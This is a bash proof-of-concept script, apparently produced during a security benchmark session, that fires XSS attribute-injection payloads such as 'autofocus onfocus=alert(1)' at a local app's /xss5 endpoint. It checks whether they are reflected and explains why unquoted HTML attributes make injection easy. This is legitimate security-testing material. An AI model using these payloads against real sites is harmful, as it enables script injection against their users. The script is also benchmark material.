#!/bin/bash
# POC: Demonstrates how unquoted HTML attributes enable trivial XSS exploitation through attribute injection without needing to escape quotes
# Target: ./repo
# Created: 2025-10-31T15:10:35.692Z
# Session: benchmark-XBEN-013-24-mhey9h03

echo "=============================================="
echo "POC: Unquoted HTML Attribute XSS Exploitation"
echo "=============================================="
echo ""
echo "This POC demonstrates how unquoted HTML attributes"
echo "make XSS exploitation significantly easier by allowing"
echo "attribute injection with just a space character."
echo ""

TARGET="http://localhost:5000"

echo "[*] Testing /xss5 endpoint with unquoted attribute exploitation..."
echo ""

# Test 1: Simple attribute injection with autofocus/onfocus
echo "[TEST 1] Payload: autofocus onfocus=alert(1)"
echo "---"
PAYLOAD1="autofocus onfocus=alert(1)"
RESPONSE1=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}/xss5?msg=${PAYLOAD1}" 2>&1)
HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE:" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE1"

if echo "$BODY1" | grep -q "autofocus"; then
    echo "[✓] VULNERABLE: Attribute injection successful"
    echo "    Found 'autofocus' in response without proper encoding"
elif echo "$BODY1" | grep -q "onfocus"; then
    echo "[✓] VULNERABLE: Event handler injection successful"
    echo "    Found 'onfocus' in response without proper encoding"
else
    echo "[!] Response doesn't contain injected attributes (may be 500 error)"
fi

echo ""
echo "Response snippet:"
echo "$BODY1" | head -20
echo ""

# Test 2: Using onclick event handler
echo "[TEST 2] Payload: onclick=prompt(document.domain)"
echo "---"
PAYLOAD2="onclick=prompt(document.domain)"
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}/xss5?msg=${PAYLOAD2}" 2>&1)
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE2"

if echo "$BODY2" | grep -q "onclick"; then
    echo "[✓] VULNERABLE: Event handler injection successful"
    echo "    Found 'onclick' in response - demonstrates trivial attribute injection"
else
    echo "[!] Response doesn't contain 'onclick'"
fi
echo ""

# Test 3: Multiple attributes injection
echo "[TEST 3] Payload: style=display:none id=pwned accesskey=x"
echo "---"
PAYLOAD3="style=display:none id=pwned accesskey=x"
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}/xss5?msg=${PAYLOAD3}" 2>&1)
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE3"

if echo "$BODY3" | grep -q "style=" || echo "$BODY3" | grep -q "id=pwned"; then
    echo "[✓] VULNERABLE: Multiple attribute injection successful"
    echo "    Successfully injected style and id attributes"
else
    echo "[!] Response doesn't contain injected style/id attributes"
fi
echo ""

# Test 4: Check if the template actually uses unquoted attributes
echo "[TEST 4] Source Code Verification"
echo "---"
echo "Checking constants.py for unquoted attribute patterns..."
if [ -f "/home/daytona/repo/src/constants.py" ]; then
    echo "[✓] Found constants.py"
    
    # Check for unquoted attributes in XSS_CONTENT template
    if grep -A5 "XSS_CONTENT =" /home/daytona/repo/src/constants.py | grep -E "type=text|type=number" | grep -v 'type="'; then
        echo "[✓] CONFIRMED: Unquoted attributes found in XSS_CONTENT template"
        echo ""
        echo "Vulnerable pattern:"
        grep -A5 "XSS_CONTENT =" /home/daytona/repo/src/constants.py | grep -E "input|type=" | head -3
    fi
    
    # Check for iframe unquoted attributes
    if grep -B2 -A2 "iframe" /home/daytona/repo/src/constants.py | grep -v 'src="'; then
        echo "[✓] CONFIRMED: Unquoted iframe attributes found"
    fi
else
    echo "[!] constants.py not found at expected location"
fi

echo ""
echo "=============================================="
echo "VULNERABILITY ANALYSIS"
echo "=============================================="
echo ""
echo "FINDING: Unquoted HTML attributes in templates enable trivial XSS"
echo ""
echo "WHY THIS IS EASIER TO EXPLOIT:"
echo "  • No need to close quotes with \" or '"
echo "  • Just a SPACE character allows attribute injection"
echo "  • Bypasses many XSS filters that look for quote characters"
echo "  • Simpler payloads = higher success rate"
echo ""
echo "ATTACK COMPARISON:"
echo ""
echo "  Quoted attribute (HARDER):"
echo '    <input type="text" value="USER_INPUT">'
echo '    Payload needs: " onfocus=alert(1) "'
echo '    Must escape quotes to break out'
echo ""
echo "  Unquoted attribute (EASIER):"
echo "    <input type=text value=USER_INPUT>"
echo "    Payload needs: onfocus=alert(1)"
echo "    Just a space breaks context!"
echo ""
echo "EVIDENCE FROM CODE:"
echo "  Line 48 of constants.py:"
echo "    <input type=text name=name placeholder=\"...\" {2}>"
echo ""
echo "  The {2} parameter receives user input without quotes,"
echo "  making attribute injection trivial."
echo ""
echo "=============================================="